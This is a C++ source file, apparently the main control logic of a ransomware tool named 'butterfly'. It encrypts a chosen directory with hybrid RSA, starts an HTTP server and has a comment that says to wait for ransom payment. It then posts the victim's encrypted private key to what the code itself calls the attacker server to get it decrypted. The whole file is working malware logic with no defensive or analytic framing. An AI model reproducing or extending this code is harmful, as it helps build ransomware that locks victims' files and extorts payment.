
#include "butterfly.h"


namespace butterfly
{

Butterfly::Butterfly(int argc, char *argv[]) : _argparse(new butterfly::ArgumentParser(argc, argv))
{

    // parse args with the argument parser
    _args = _argparse->parseArgs();

    // init logging
    initLoggingFramework();

}

void Butterfly::initLoggingFramework()
{
    // Logger is disabled as default setting
    #ifdef LOGGING
    Logger::disable();
    #endif

    if ( !_args.config.empty() )
    {
        // init logger instance
        #ifdef LOGGING
        Logger::initFromConfig(_args.config);
        #endif
    }
    
    #ifdef LOGGING
    if( Logger::isConfigFileAvailable() )
    {
        LOG_INFO("Running " << PROJECT_NAME << " version " << _args.version);
    } else
    {
        std::cout << "Running " << PROJECT_NAME << " version " << _args.version << std::endl;
    }
    #else
    std::cout << "Running " << PROJECT_NAME << " version " << _args.version << std::endl;
    #endif
}

void Butterfly::run()
{

    // Start Hybrid Encryption Mechanism (Encryption + Remote Server Request + Decryption)
    if ( !_args.dir.empty() )
    {
        // Start encryption
        std::unique_ptr<butterfly::hybrid::Encryptor> encryptor(new butterfly::hybrid::Encryptor(2048));
        std::cout << "Start Encryption+Decryption from directory " << _args.dir << std::endl;
        encryptor->invokeDir(_args.dir, _args.protection);

        // After encryption start http server, gui or wallpaper
        std::shared_ptr<butterfly::HTTPServer> server = std::make_shared<butterfly::HTTPServer>(8081);
        //server->registerMasterPKeyCB(std::bind(&hybrid::Decryptor::invokeDir, decryptor, std::placeholders::_1));
        server->run();

        // Wait for ransom payment

        // Create HTTP Get Request to bflyServerApp to get the decrypted CPrivateRSA.pem string

        // Start decryption
        std::shared_ptr<butterfly::hybrid::Decryptor> decryptor = std::make_shared<butterfly::hybrid::Decryptor>();
        decryptor->setDirPath(_args.dir);
        //decryptor->invokeDir("/home/christian/projects/butterfly/masterkeys/SPrivateRSA.pem");
    }
    // Start only Encryption
    else if ( !_args.encrypt.empty() )
    {

        std::unique_ptr<butterfly::hybrid::Encryptor> encryptor(new butterfly::hybrid::Encryptor(2048));
        std::cout << "Start Encryption from directory " << _args.encrypt << std::endl;
        encryptor->invokeDir(_args.encrypt, _args.protection);

    }
    // Start decryption with the remote decrypted file
    else if ( !_args.decrypt.empty() && _args.serverpKey.empty())
    {
        std::cout << "Start Decryption from directory " << _args.decrypt << std::endl;

        if ( butterfly::existsFile(butterfly::ENC_CPRIVATERSA_FILENAME) )
        {
            if ( butterfly::existsFile(butterfly::RSA_EKIV_FILENAME) )
            {
                // Convert bin files to hex
                std::string cprivatersa_bin = butterfly::readBinFile(butterfly::ENC_CPRIVATERSA_FILENAME);
                std::string rsa_bin = butterfly::readBinFile(butterfly::RSA_EKIV_FILENAME);

                std::string cprivatersa_hex = butterfly::string2Hex(cprivatersa_bin);
                std::string rsa_hex = butterfly::string2Hex(rsa_bin);

                // ConnManager instance to check whether internet is available for the POST request to the attacker server or not
                std::unique_ptr<butterfly::ConnManager> connManager(new butterfly::ConnManager());
                while ( !connManager->isInternetAvailable() )
                {
                    #ifdef LOGGING
                    LOG_ERROR("Please check your internet connection!");
                    #else
                    std::cout << "Please check your internet connection!" << std::endl;
                    #endif
                    sleep(5);
                }

                // HTTPClient to send post request to decrypt the CPrivateRSA.bin file
                std::unique_ptr<butterfly::HTTPClient> httpClient(new butterfly::HTTPClient(5000));
                httpClient->setFormParam("CPrivateRSA.bin", cprivatersa_hex);
                httpClient->setFormParam("RSA.bin", rsa_hex);
                std::string decryptedCPrivateRSAStr = httpClient->post("http://localhost:5000/decryption/");

                // Decryptor instance to invoke the directory for the decryption process
                std::unique_ptr<butterfly::hybrid::Decryptor> decryptor(new butterfly::hybrid::Decryptor());
                decryptor->setDecryptedCPrivateRSAStr(decryptedCPrivateRSAStr);
                decryptor->invokeDir(_args.decrypt);

            } else
            {
                #ifdef LOGGING
                LOG_ERROR("File not found " << butterfly::RSA_EKIV_FILENAME);
                #endif
                throw FileNotFoundException("File not found " + butterfly::RSA_EKIV_FILENAME);
            }
        } else
        {
            #ifdef LOGGING
            LOG_ERROR("File not found " << butterfly::ENC_CPRIVATERSA_FILENAME)
            #endif
            throw FileNotFoundException("File not found " + butterfly::ENC_CPRIVATERSA_FILENAME);
        }

    }
    // Start Decryption with provided key
    else if ( !_args.decrypt.empty() && !_args.serverpKey.empty())
    {
        std::unique_ptr<butterfly::hybrid::Decryptor> decryptor(new butterfly::hybrid::Decryptor());
        std::cout << "Start Decryption with provided key " << _args.serverpKey << " from directory " << _args.decrypt << std::endl;
        decryptor->decryptCPrivateRSA(_args.serverpKey, butterfly::ENC_CPRIVATERSA_FILENAME);
        decryptor->invokeDir(_args.decrypt);
    }
    else
    {
        throw ButterflyException("Invalid usage of the command line arguments!");
    }

}

} // namespace butterfly
